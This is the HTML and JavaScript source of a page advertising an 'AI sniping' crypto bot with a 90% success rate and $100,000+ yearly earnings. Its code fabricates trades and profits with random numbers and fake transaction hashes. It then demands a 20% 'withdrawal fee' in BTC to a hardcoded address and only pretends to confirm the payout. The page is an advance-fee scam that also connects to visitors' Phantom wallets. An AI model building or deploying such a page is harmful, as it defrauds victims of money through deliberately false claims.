<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>M & M AI SNIPING PLATFORM</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Orbitron', sans-serif;
      background: radial-gradient(circle at center, #0a0a23, #000);
      color: #00eaff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
    }
    .section {
      background: rgba(0, 0, 50, 0.4);
      border: 2px solid #00eaff;
      border-radius: 2xl;
      padding: 2rem;
      max-width: 800px;
      width: 100%;
      box-shadow: 0 0 20px #00eaff;
      margin-bottom: 2rem;
    }
    h2 {
      text-align: center;
      color: #ffffff;
    }
    p, label {
      color: #ffffff;
      font-size: 1rem;
    }
    button {
      padding: 1rem;
      margin-top: 1rem;
      background: #00eaff;
      color: #000;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 0 10px #00eaff;
      transition: all 0.3s ease;
    }
    button:hover {
      background: #00b2cc;
      box-shadow: 0 0 20px #00b2cc;
    }
    .disabled {
      opacity: 0.4;
      pointer-events: none;
    }
    .log {
      background: #000;
      color: #0f0;
      padding: 1rem;
      height: 200px;
      overflow-y: auto;
      font-size: 0.9rem;
      border: 1px solid #00eaff;
      margin-top: 1rem;
    }
    input, select {
      padding: 0.6rem;
      width: 100%;
      margin-top: 0.5rem;
      border-radius: 6px;
      border: none;
      font-family: 'Orbitron', sans-serif;
    }
    #wallet-address {
      font-size: 0.9rem;
      color: #00ffae;
      word-break: break-all;
      margin-top: 0.5rem;
    }
  </style>
</head>
<body>
  <div class="section">
    <h2>M & M AI SNIPING PLATFORM</h2>
    <p><strong>Success Rate:</strong> 90%</p>
    <p><strong>Enter $50 USD to activate the bot (via Phantom wallet).</strong></p>
    <p><strong>Withdrawal Fee:</strong> 20% of sniped earnings in BTC</p>
    <p><strong>BTC Address:</strong> <code>bc1qf0ca520yfhny6c9pvmfsu08fv5ejqlf52as69w</code></p>
    <p><strong>Note:</strong> $50 in profit is required to activate the withdrawal button.</p>
  </div>

  <div class="section disabled" id="sniper-section">
    <h2>Sniping Engine</h2>
    <button onclick="startSniping()">Start Sniping</button>
    <p><strong>Total Profit:</strong> $<span id="profit">0.00</span></p>
    <div class="log" id="log"></div>
  </div>

  <div class="section disabled" id="withdrawal-section">
    <h2>Withdraw Your Earnings</h2>
    <p>To release your profit, pay 20% of total earnings in BTC to the address above.</p>
    <label>Enter BTC TX ID for Withdrawal Fee:</label>
    <input type="text" id="withdrawalTxid" placeholder="Paste your BTC TX ID here">
    <button onclick="confirmWithdrawal()">Confirm Withdrawal</button>
    <p id="withdrawal-status"></p>
  </div>

  <div class="section">
    <h2>Yearly Earnings Estimate</h2>
    <p><strong>To earn $100,000+ per year, you will need approximately 6-7 SOL in your Phantom wallet.</strong></p>
    <p>This estimate is based on $50 USD in profit per day with a 90% success rate. The amount of SOL required will adjust in real time depending on market conditions.</p>
  </div>

  <script>
    let botActive = false;
    let profit = 0;
    let withdrawalReady = false;
    let walletSOLBalance = 0;

    async function checkSOLBalance() {
      try {
        const publicKey = window.solana.publicKey.toString();
        const response = await fetch(`https://api.mainnet-beta.solana.com`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "getBalance",
            params: [publicKey],
          }),
        });
        const result = await response.json();
        walletSOLBalance = result.result.value / 1000000000; // Convert lamports to SOL
        console.log(`Wallet SOL balance: ${walletSOLBalance} SOL`);

        // Enable sniping if balance is sufficient
        if (walletSOLBalance >= 50 && !botActive) {
          startSniping();  // Automatically start sniping when $50 SOL is detected
        } else {
          console.log("Insufficient balance to start sniping.");
        }
      } catch (err) {
        console.error('Error checking balance:', err);
      }
    }

    window.addEventListener('load', async () => {
      if (window.solana && window.solana.isPhantom) {
        try {
          const resp = await window.solana.connect({ onlyIfTrusted: true });
          document.getElementById('wallet-address').textContent = `Connected: ${resp.publicKey.toString()}`;
          // Check wallet SOL balance after connection
          await checkSOLBalance();
        } catch (err) {
          console.log('Phantom not connected yet.');
        }
      }
    });

    function startSniping() {
      const logEl = document.getElementById('log');
      logEl.innerHTML = 'Starting snipes...';
      botActive = true;

      const interval = setInterval(() => {
        if (!botActive) return clearInterval(interval);
        const success = Math.random() < 0.9;
        const profitEarned = success ? (Math.random() * (5 - 0.1) + 0.1).toFixed(2) : 0;
        if (success) {
          profit += parseFloat(profitEarned);
          document.getElementById('profit').textContent = profit.toFixed(2);
        }
        const txHash = '0x' + Math.random().toString(16).substring(2, 10);
        const msg = success ? `✅ Sniped - TX: ${txHash} | +$${profitEarned}` : `❌ Failed - TX: ${txHash}`;
        logEl.innerHTML += `<div>${msg}</div>`;
        logEl.scrollTop = logEl.scrollHeight;

        // Show withdrawal section after earning $50 profit
        if (profit >= 50 && !withdrawalReady) {
          document.getElementById('withdrawal-section').classList.remove('disabled');
          withdrawalReady = true;
        }
      }, 3000);
    }

    function confirmWithdrawal() {
      const txid = document.getElementById('withdrawalTxid').value.trim();
      if (txid.length < 10) {
        document.getElementById('withdrawal-status').textContent = '❌ Invalid TX ID';
        return;
      }
      document.getElementById('withdrawal-status').textContent = `✅ Withdrawal confirmed. $${(profit * 0.8).toFixed(2)} available.`;
    }
  </script>
</body>
</html>
